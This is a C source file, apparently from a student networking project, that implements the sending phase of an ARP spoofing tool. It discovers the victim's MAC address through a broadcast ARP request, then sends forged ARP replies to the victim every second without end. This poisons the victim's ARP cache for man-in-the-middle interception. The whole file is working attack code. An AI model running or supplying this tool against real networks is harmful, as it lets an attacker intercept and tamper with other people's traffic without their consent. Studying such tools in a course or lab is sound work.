/*
** EPITECH PROJECT, 2018
** NWP_myarpspoof_2018
** File description:
** NWP_myarpspoof_2018 send_phase.c
*/
#include <stdlib.h>
#include <stdio.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include "packet.h"

void my_arpspoof(core_t *core, struct sockaddr_ll *sine)
{
    char victim_mac_addr_str[16] = {0};
    char buf[65535];

    send_to_broadcast(core, sine);
    get_victim_mac_address(core, sine, victim_mac_addr_str, buf);
}

void send_to_broadcast(core_t *core, struct sockaddr_ll *sine)
{
    arp_header_t *arp;
    ethernet_header_t *eth;

    arp = create_arp_header(core, BROADCAST);
    eth = create_ethernet_header(core, BROADCAST, arp);
    sine->sll_ifindex = if_nametoindex(core->interface);
    if ((sendto(core->socket, eth, 42, 0,
    (const struct sockaddr *)sine, sizeof(*sine))) <= 0)
            perror("sendto: ");
}

void get_victim_mac_address(core_t *core, struct sockaddr_ll *sine,
    char victim_mac_addr_str[16], char buf[65535])
{
    arp_header_t *arp;
    ethernet_header_t *eth;
    uint8_t *victim_mac_addr = malloc(sizeof(uint8_t) * 6);

    while (1) {
        if (recvfrom(core->socket, buf, 65535, 0, NULL, NULL) <= 0)
            error(ERROR_ARGS);
        eth = (ethernet_header_t *)buf;
        if (ntohs(eth->type) != 0x0806)
            continue;
        arp = (arp_header_t *)(buf + 14);
        if (ntohs(arp->opcode) != 2 || (arp->sender_ip_addr &&
        !inet_ntop(AF_INET, arp->sender_ip_addr, victim_mac_addr_str, 16)) ||
        strcmp(victim_mac_addr_str, core->target_ip)) {
            memset(victim_mac_addr_str, 0, *core->target_ip);
            continue;
        }
        memcpy(victim_mac_addr, arp->sender_mac_addr, 6 * sizeof(uint8_t));
        break;
    }
    spoof_victim(sine, victim_mac_addr, core);
}

void spoof_victim(struct sockaddr_ll *sine, uint8_t *victim_mac_addr,
    core_t *core)
{
    arp_header_t *arp = create_arp_header(core, victim_mac_addr);
    ethernet_header_t *eth;

    arp->opcode = htons(2);
    eth = create_ethernet_header(core, victim_mac_addr, arp);
    printf("Found victim's MAC address: '%.2X:%.2X:%.2X:%.2X:%.2X:%.2X'\n"
    , victim_mac_addr[0], victim_mac_addr[1], victim_mac_addr[2],
    victim_mac_addr[3], victim_mac_addr[4], victim_mac_addr[5]);
    while (1) {
        if ((sendto(core->socket, eth, 42, 0,
            (const struct sockaddr *)sine, sizeof(*sine)) <= 0))
                perror("sendto: ");
        printf("Spoofed packet send to '%s'\n", core->target_ip);
        sleep(1);
    }
}
